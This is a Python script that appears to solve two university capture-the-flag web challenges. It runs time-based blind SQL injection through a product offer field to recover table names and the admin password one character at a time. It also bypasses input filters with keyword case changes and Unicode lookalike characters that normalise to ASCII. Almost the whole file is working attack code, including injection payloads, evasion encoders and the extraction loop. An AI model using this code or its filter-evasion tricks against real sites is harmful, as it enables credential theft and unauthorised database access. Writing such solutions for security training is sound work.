import requests
import string
import binascii
import time
import unicodedata
import random

def sth(input_string):
    encoded_bytes = input_string.encode('utf-8')
    hex_representation = binascii.hexlify(encoded_bytes).decode('utf-8')
    return hex_representation.upper()


encodings = {}
def find_encodings():
    for original_c in string.printable:
        for code in range(0, 0xFFFF + 1):
            char = chr(code)
            normalized = unicodedata.normalize('NFKC', char)

            if normalized == original_c and char != original_c:
                encodings[original_c] = encodings.get(original_c) + [char] if encodings.get(original_c) else [char]


def first_encode(input_string: str):
    encoded_string = ''
    encoded_string = input_string \
        .replace('or', 'Or').replace('OR', 'Or') \
        .replace('and', 'And').replace('AND', 'And') \
        .replace('select', 'Select').replace('SELECT', 'Select') \
        .replace('from', 'From').replace('FROM', 'From') \
        .replace('where', 'Where').replace('WHERE', 'Where') \

    return encoded_string


def second_encode(input_string: str):
    input_string = input_string.lower()
    for c in input_string:
        char_replacements = encodings.get(c)
        if char_replacements:
            replacement = random.choice(char_replacements)
            input_string = input_string.replace(c, replacement)

    return input_string


def timing_attack(url, session, secret, treshold, template, encode):
    while True:
        found = False
        for c in string.printable:
            injection = template + f"{sth(secret + c)}" + encode("%')")

            start = time.time()
            _ = session.post(url + f'/product/11', data={'offer': injection})
            end = time.time()

            if end - start > treshold:
                secret += c
                found = True
                print(f'Found ({c}): {secret}')
                continue
            else:
                pass

        if not found:
            break

    return secret


def find_tables(url, session, treshold, encode):
    # should be string.printable but for the sake of the report we will use only the first 2 characters of the known tables
    for starting_char in 'pu':
        table_name = starting_char
        injection = encode(f"1 and (select sleep({treshold}) from information_schema.tables where table_schema = DATABASE() And HEX(table_name) like '")
        print(f'Injection: {injection}')
        found = timing_attack(url, session, table_name, treshold, injection, encode)
        print(f'Found table: {found}\n')


def find_password(url, session, treshold, encode):
    secret = ''
    injection = encode(f"1 and (select sleep({treshold}) from user where username = 'admin' and hex(password) like '")
    print(f'Injection: {injection}')
    password = timing_attack(url, session, secret, treshold, injection, encode)
    print(f'Found admin password: {password}\n')


url = 'http://cyberchallenge.disi.unitn.it'

# find unicode replacements for all characters to bypass the second challenge's filter
find_encodings()

# ======== Auction 1 ========
s = requests.Session()
_ = s.post(url + f':{50050}' + '/login', data={'username': 'golim', 'password': 'password'})

# find tables (can use first challenge's encoding bypass)
find_tables(url + f':{50050}', s, treshold=2, encode=first_encode)

admin_pass = find_password(url + f':{50050}', s, treshold=2, encode=first_encode)


# ======== Auction 2 ========
s = requests.Session()
_ = s.post(url + f':{50055}' + '/login', data={'username': 'golim', 'password': 'password'})
admin_pass = find_password(url + f':{50055}', s, treshold=2, encode=second_encode)

